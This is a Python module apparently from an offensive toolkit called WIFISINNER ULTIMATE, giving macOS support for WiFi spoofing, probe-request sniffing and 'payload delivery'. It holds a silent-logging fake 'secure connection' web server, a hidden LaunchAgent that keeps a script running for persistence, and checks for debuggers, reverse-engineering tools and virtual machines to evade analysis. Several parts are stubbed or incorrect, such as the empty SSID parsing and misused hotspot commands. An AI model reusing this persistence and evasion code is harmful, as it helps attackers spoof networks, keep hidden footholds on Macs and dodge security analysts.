#!/usr/bin/env python3
"""
WIFISINNER ULTIMATE - macOS Compatibility Layer

Provides macOS-specific implementations for WiFi spoofing,
device detection, and payload delivery.
"""

import os
import platform
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path


def is_macos():
    """Check if running on macOS"""
    return platform.system() == "Darwin"


def is_linux():
    """Check if running on Linux"""
    return platform.system() == "Linux"


def is_android():
    """Check if running on Android (via Termux)"""
    return "termux" in os.environ.get("PREFIX", "").lower()


class MacOSWiFi:
    """macOS-specific WiFi control"""
    
    def __init__(self, iface="en0"):
        self.iface = iface
        self.original_state = None
        
    def scan_networks(self):
        """Scan for nearby networks on macOS"""
        networks = []
        
        try:
            # Use airport utility
            airport_path = self._find_airport()
            
            if airport_path:
                result = subprocess.run(
                    [airport_path, "-s", "-x"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                # Parse XML output
                for line in result.stdout.split("\n"):
                    if "<key>SSID</key>" in line:
                        # Extract SSID
                        pass  # Simplified - full implementation would parse XML
            else:
                # Fallback to networksetup
                result = subprocess.run(
                    ["networksetup", "-listallwirelessnetworks"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                for line in result.stdout.split("\n"):
                    if line.strip():
                        networks.append({"ssid": line.strip()})
                        
        except Exception as e:
            print(f"[macOS WiFi] Scan failed: {e}")
        
        return networks
    
    def _find_airport(self):
        """Find airport utility path"""
        paths = [
            "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport",
            "/usr/local/bin/airport",
            "/opt/local/bin/airport"
        ]
        
        for path in paths:
            if Path(path).exists():
                return path
        
        # Try to find via which
        try:
            result = subprocess.run(["which", "airport"], capture_output=True, text=True)
            if result.stdout.strip():
                return result.stdout.strip()
        except:
            pass
        
        return None
    
    def create_hotspot(self, ssid, channel=6, password=None):
        """Create hotspot on macOS"""
        try:
            # macOS sharing-based hotspot
            # Note: Limited control compared to Linux
            
            # Enable Internet Sharing
            cmd = [
                "networksetup",
                "-setairportpower",
                self.iface,
                "on"
            ]
            subprocess.run(cmd, timeout=5)
            
            # Create network
            if password:
                cmd = [
                    "networksetup",
                    "-createenetworkservice",
                    ssid
                ]
                subprocess.run(cmd, timeout=5)
            
            return True
        except Exception as e:
            print(f"[macOS WiFi] Hotspot creation failed: {e}")
            return False
    
    def get_interface_info(self):
        """Get WiFi interface information"""
        try:
            result = subprocess.run(
                ["ifconfig", self.iface],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            info = {}
            for line in result.stdout.split("\n"):
                if "inet " in line and "127.0.0.1" not in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        info["ip"] = parts[1]
                if "addr:" in line:
                    parts = line.split()
                    for part in parts:
                        if ":" in part and len(part) == 17:
                            info["mac"] = part
            
            return info
        except:
            return {}


class MacOSProbeSniffer:
    """macOS probe request sniffer"""
    
    def __init__(self, iface="en0"):
        self.iface = iface
        self.probes = []
        self.running = False
        
    def start_sniffing(self):
        """Start sniffing probe requests"""
        self.running = True
        
        def sniff_loop():
            while self.running:
                try:
                    # Use tcpdump for probe capture
                    cmd = [
                        "sudo",
                        "tcpdump",
                        "-i", self.iface,
                        "-c", "100",
                        "-n",
                        "ether host ff:ff:ff:ff:ff:ff"
                    ]
                    
                    result = subprocess.run(
                        cmd,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    
                    # Parse output for probe requests
                    for line in result.stdout.split("\n"):
                        if "Probe Request" in line or "Mgmt" in line:
                            self.probes.append({
                                "raw": line,
                                "timestamp": datetime.now()
                            })
                    
                    time.sleep(1)
                    
                except Exception as e:
                    time.sleep(2)
        
        thread = threading.Thread(target=sniff_loop, daemon=True)
        thread.start()
        return thread
    
    def stop(self):
        """Stop sniffing"""
        self.running = False


class MacOSOTAAdapter:
    """macOS OTA delivery adapter"""
    
    def __init__(self, host="192.168.1.1", port=8080):
        self.host = host
        self.port = port
        
    def start_server(self):
        """Start OTA delivery server"""
        import socketserver
        from http.server import SimpleHTTPRequestHandler
        
        class OTAHandler(SimpleHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                html = """
                <html>
                <head><title>Connecting...</title></head>
                <body>
                    <h1>Establishing secure connection...</h1>
                    <script>
                        console.log("Connected from:", window.location);
                    </script>
                </body>
                </html>
                """
                self.wfile.write(html.encode())
            
            def log_message(self, format, *args):
                pass  # Silent logging
        
        # Try multiple addresses for compatibility
        addresses = ["0.0.0.0", "127.0.0.1", self.host]
        
        for addr in addresses:
            try:
                server = socketserver.TCPServer((addr, self.port), OTAHandler)
                server.allow_reuse_address = True
                
                print(f"[macOS OTA] Server listening on {addr}:{self.port}")
                
                thread = threading.Thread(target=server.serve_forever, daemon=True)
                thread.start()
                
                return thread
            except Exception as e:
                if addr == addresses[-1]:
                    print(f"[macOS OTA] Server failed: {e}")
                    return None


class MacOSPersistence:
    """macOS persistence mechanisms"""
    
    def __init__(self):
        self.launchd_plist = Path("~/Library/LaunchAgents/com.wifisinner.helper.plist").expanduser()
        
    def create_persistence(self, script_path):
        """Create LaunchAgent persistence"""
        try:
            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.wifisinner.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/wifisinner.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/wifisinner.err</string>
</dict>
</plist>
"""
            self.launchd_plist.write_text(plist)
            
            # Load LaunchAgent
            subprocess.run(["launchctl", "load", str(self.launchd_plist)], timeout=5)
            
            print(f"[macOS Persistence] LaunchAgent created")
            return True
            
        except Exception as e:
            print(f"[macOS Persistence] Failed: {e}")
            return False
    
    def remove_persistence(self):
        """Remove LaunchAgent persistence"""
        try:
            if self.launchd_plist.exists():
                subprocess.run(["launchctl", "unload", str(self.launchd_plist)], timeout=5)
                self.launchd_plist.unlink()
                print(f"[macOS Persistence] LaunchAgent removed")
                return True
        except:
            pass
        
        return False


class MacOSDetector:
    """macOS environment detector"""
    
    def __init__(self):
        self.detections = []
    
    def check_debugger(self):
        """Check for LLDB/GDB"""
        try:
            result = subprocess.run(["which", "lldb"], capture_output=True, text=True)
            if result.stdout.strip():
                self.detections.append("lldb")
                return True
            
            result = subprocess.run(["which", "gdb"], capture_output=True, text=True)
            if result.stdout.strip():
                self.detections.append("gdb")
                return True
        except:
            pass
        
        return False
    
    def check_analyzers(self):
        """Check for analysis tools"""
        analyzers = ["frida", "objection", "jadx", "apktool"]
        
        for analyzer in analyzers:
            try:
                result = subprocess.run(["which", analyzer], capture_output=True, text=True)
                if result.stdout.strip():
                    self.detections.append(analyzer)
            except:
                pass
        
        return len(self.detections) > 0
    
    def check_virtualization(self):
        """Check if running in VM"""
        try:
            # Check for VM indicators
            result = subprocess.run(
                ["system_profiler", "SPHardwareDataType"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            vm_indicators = ["VirtualBox", "VMware", "Parallels", "Virtual Machine"]
            
            for indicator in vm_indicators:
                if indicator in result.stdout:
                    self.detections.append(f"vm:{indicator}")
                    return True
        except:
            pass
        
        return False
    
    def get_assessment(self):
        """Get risk assessment"""
        self.check_debugger()
        self.check_analyzers()
        self.check_virtualization()
        
        score = len(self.detections) * 20
        
        return {
            "risk_score": min(score, 100),
            "detections": self.detections,
            "risk_level": "CRITICAL" if score >= 60 else "HIGH" if score >= 40 else "MEDIUM" if score >= 20 else "LOW"
        }


class MacOSAdapter:
    """Main macOS adapter for WIFISINNER ULTIMATE"""
    
    def __init__(self):
        self.wifi = MacOSWiFi()
        self.sniffer = MacOSProbeSniffer()
        self.ota = MacOSOTAAdapter()
        self.persistence = MacOSPersistence()
        self.detector = MacOSDetector()
        self.active = False
        
    def initialize(self):
        """Initialize macOS environment"""
        print(f"[macOS] Initializing macOS adapter...")
        
        # Check prerequisites
        self._check_prerequisites()
        
        # Get interface info
        info = self.wifi.get_interface_info()
        print(f"[macOS] Interface: {self.wifi.iface}")
        if "ip" in info:
            print(f"[macOS] IP: {info['ip']}")
        
        # Run detector
        assessment = self.detector.get_assessment()
        print(f"[macOS] Risk assessment: {assessment['risk_level']} ({assessment['risk_score']})")
        
        return True
    
    def _check_prerequisites(self):
        """Check macOS prerequisites"""
        required = ["networksetup", "ifconfig", "tcpdump"]
        
        missing = []
        for tool in required:
            try:
                result = subprocess.run(["which", tool], capture_output=True, text=True)
                if not result.stdout.strip():
                    missing.append(tool)
            except:
                missing.append(tool)
        
        if missing:
            print(f"[macOS] Missing tools: {missing}")
            print(f"[macOS] Some features may be limited")
    
    def start_operation(self):
        """Start full operation on macOS"""
        self.active = True
        
        print(f"\n[macOS] Starting operation...")
        
        # Start probe sniffer
        print(f"[macOS] Starting probe sniffer...")
        self.sniffer.start_sniffing()
        
        # Start OTA server
        print(f"[macOS] Starting OTA server...")
        self.ota.start_server()
        
        print(f"[macOS] ✓ Operation started")
        print(f"[macOS] Note: Full capabilities require Linux. macOS is in compatibility mode.")
    
    def stop_operation(self):
        """Stop operation"""
        self.active = False
        
        print(f"\n[macOS] Stopping operation...")
        
        self.sniffer.stop()
        
        print(f"[macOS] ✓ Operation stopped")


def get_platform_adapter():
    """Get appropriate platform adapter"""
    if is_macos():
        return MacOSAdapter()
    elif is_linux():
        # Return None for Linux (uses native modules)
        return None
    else:
        print(f"[Platform] Unknown platform: {platform.system()}")
        return None


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="WIFISINNER Ultimate - macOS Adapter")
    parser.add_argument("--iface", default="en0", help="WiFi interface (default: en0)")
    parser.add_argument("--scan", action="store_true", help="Scan for networks")
    parser.add_argument("--start", action="store_true", help="Start operation")
    parser.add_argument("--detect", action="store_true", help="Run detection")
    args = parser.parse_args()
    
    print(f"\n{'='*60}")
    print(f"WIFISINNER ULTIMATE - macOS COMPATIBILITY")
    print(f"{'='*60}\n")
    
    adapter = MacOSAdapter()
    adapter.wifi.iface = args.iface
    
    if args.detect:
        assessment = adapter.detector.get_assessment()
        print(f"Risk Score: {assessment['risk_score']}")
        print(f"Risk Level: {assessment['risk_level']}")
        print(f"Detections: {assessment['detections']}")
    
    elif args.scan:
        networks = adapter.wifi.scan_networks()
        print(f"\nFound {len(networks)} networks:")
        for net in networks[:10]:
            print(f"  {net.get('ssid', 'Unknown')}")
    
    elif args.start:
        adapter.initialize()
        adapter.start_operation()
        
        try:
            while True:
                time.sleep(1)
                if adapter.sniffer.probes:
                    print(f"[macOS] Probes captured: {len(adapter.sniffer.probes)}")
        except KeyboardInterrupt:
            adapter.stop_operation()
    
    else:
        print(f"Usage:")
        print(f"  --scan      Scan for networks")
        print(f"  --start     Start operation")
        print(f"  --detect    Run environment detection")
